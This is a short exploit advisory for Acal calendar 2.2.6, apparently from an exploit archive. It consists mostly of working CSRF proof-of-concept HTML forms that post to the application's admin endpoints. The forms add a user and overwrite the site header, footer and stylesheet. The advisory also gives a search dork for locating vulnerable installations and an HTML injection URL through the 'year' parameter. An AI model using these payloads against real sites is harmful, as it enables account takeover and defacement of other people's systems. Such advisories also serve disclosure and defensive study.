@@ -1,0 +1,36 @@
+# Exploit Title: [Acal calendar 2.2.6 CSRF Vulnerability]
+# Date:          [11-03-2012]
+# Author:        [Number 7]
+# Software Link: [http://sourceforge.net/projects/acalproj/files/latest/download?source=directory]
+# Version:       [2.2.6]
+# Dork:          ["Calendar Admin: Edit Header and Footer"]
+# Tested on:     [Windows,Linux]
+____________________________________________________________________________
+Add User<br>
+<form method="post" action="http://localhost/ACal-2.2.6/calendar/admin/changelogin.php?action=add"><br>
+Username: <br>
+<input type="text" size="20" name="user" /><br>
+Password:<br>
+ <input type="password" size="20" name="pass" />
+<input type="submit" value="Add User" /></form>
+
+Edit/Add Header
+<form action="http://localhost/ACal-2.2.6/calendar/admin/edit.php?edit=header" method="post">
+<textarea cols="60" rows="14" name="header">Write New Header Here.&lt;/textarea&gt;
+<input type="submit" value="Submit Changes" />
+
+Edit/Add Footer
+<form action="http://localhost/ACal-2.2.6/calendar/admin/edit.php?edit=footer" method="post">
+<textarea cols="60" rows="14" name="footer">Write New Footer Here.&lt;/textarea&gt;
+<input type="submit" value="Submit Changes" />
+</form>
+
+
+Style Options
+<form method="post" action="http://localhost/ACal-2.2.6/calendar/admin/style.php?edit=style">
+<textarea name="stylesheet" cols="60" rows="20">&lt;/textarea&gt;
+<input type="submit" value="Edit" />
+
+HTML INJECTION:
+http://localhost/ACal-2.2.6/calendar/calendar.php?year=Inject HTML Code here.
+____________________________________________________________________________
